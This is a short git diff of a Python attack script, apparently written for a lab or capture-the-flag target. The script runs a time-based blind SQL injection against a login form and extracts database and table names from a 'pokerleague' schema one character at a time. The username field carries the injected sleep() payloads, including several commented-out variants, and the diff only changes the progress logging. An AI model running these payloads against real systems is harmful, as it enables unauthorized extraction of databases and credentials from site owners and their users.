@@ -24,7 +24,7 @@ def sqli():
     time.sleep(2)
     
     l2= log.progress("Datos Encontrados")
-
+    l3= log.progress("Query")
 
     for position in range(1, 100):
         for i in characters:
@@ -33,10 +33,9 @@ def sqli():
                 #"username": f"admin' and if(substr(database(),{position},1)='{i}',sleep(0.9),1)-- -",
                 #"username": f"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{i}',sleep(0.9),1)-- -",
                 "username": f"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{position},1)='{i}',sleep(0.9),1)-- -",
-            
                 "password": "SAD" 
             }
-            l1.status(f"{post_data['username']}")
+            l3.status(f"{post_data['username']}")
 
             time_start = time.time()
             r = requests.post(URL, headers=cabeceras, data=post_data)
